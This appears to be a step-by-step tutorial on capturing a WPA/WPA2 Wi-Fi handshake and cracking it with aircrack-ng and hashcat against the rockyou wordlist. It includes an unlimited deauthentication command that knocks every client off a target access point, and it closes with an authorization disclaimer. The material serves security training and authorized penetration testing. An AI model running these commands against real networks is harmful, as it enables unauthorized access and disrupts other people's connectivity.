📡 WPA/WPA2 Wi-Fi Handshake Capture & Cracking (Aircrack-ng Suite)

This guide demonstrates how to capture a 4-way WPA/WPA2 handshake and crack it using a wordlist.

> ⚠️ **Educational purposes only.** Ensure you have authorization before testing any network.

---

## 🔧 Prerequisites

- A wireless adapter that supports **monitor mode** and **packet injection**
- Kali Linux or any Linux with `aircrack-ng` and `Wireshark` installed
- Wordlist (e.g., `rockyou.txt`)

---

## 🛰️ Step-by-Step Process

### 1️⃣ View Available Wireless Interfaces

```bash
iw dev
````

---

### 2️⃣ Kill Interfering Processes

```bash
sudo airmon-ng check kill
```

This stops services like `NetworkManager` that interfere with monitor mode.

---

### 3️⃣ Enable Monitor Mode on Interface

```bash
sudo airmon-ng start wlan0
```

✅ This changes interface `wlan0` to `wlan0mon`.

---

### 4️⃣ Scan Nearby Access Points

```bash
sudo airodump-ng wlan0mon
```

Take note of:

* **BSSID** (MAC address of target AP)
* **Channel** (CH)
* **ESSID** (Wi-Fi name)

---

### 5️⃣ Capture the Handshake

```bash
sudo airodump-ng -w captures --bssid <BSSID> --channel <CH> wlan0mon
```

* Replace `<BSSID>` with the MAC of the target AP
* Replace `<CH>` with the channel number
* The handshake will appear in the top-right when a client reconnects

---

### 6️⃣ Trigger Deauthentication (New Terminal)

In a **new terminal**, run:

```bash
sudo aireplay-ng --deauth 0 -a <BSSID> wlan0mon
```

* This disconnects all clients from the AP
* When clients reconnect, the handshake is captured

---

### 7️⃣ Verify the Handshake with Wireshark

Open the capture file:

```bash
wireshark captures-01.cap
```

* Apply Wireshark filter:

  ```
  eapol
  ```
* Look for “**Message 2 of 4**” to confirm the handshake

---

### 8️⃣ Stop Monitor Mode

```bash
sudo airmon-ng stop wlan0mon
```

---

### 9️⃣ Prepare the Wordlist

Unzip the popular wordlist:

```bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

---

### 🔓 1️⃣0️⃣ Crack the Handshake

```bash
sudo aircrack-ng captures-01.cap -w /usr/share/wordlists/rockyou.txt
```
If you found PMKID
```
sudo hashcat -m 22000 -a 0 pmkid_xxxxxxxx_xx-xx-xx-xx-xx-xx_xxxx-xx-xxxxx-xx-xx.22000 /home/kali/Desktop/rockyou.txt 
```

✅ If the password exists in the wordlist, it will be revealed.

---

## ⚠️ Legal Disclaimer

This guide is intended for:

* Cybersecurity training
* Authorized penetration testing
* Ethical hacking education

❗ **Unauthorized use of these techniques is illegal. Always have explicit permission.**

---

🔐 *Learn. Practice. Respect digital boundaries.*
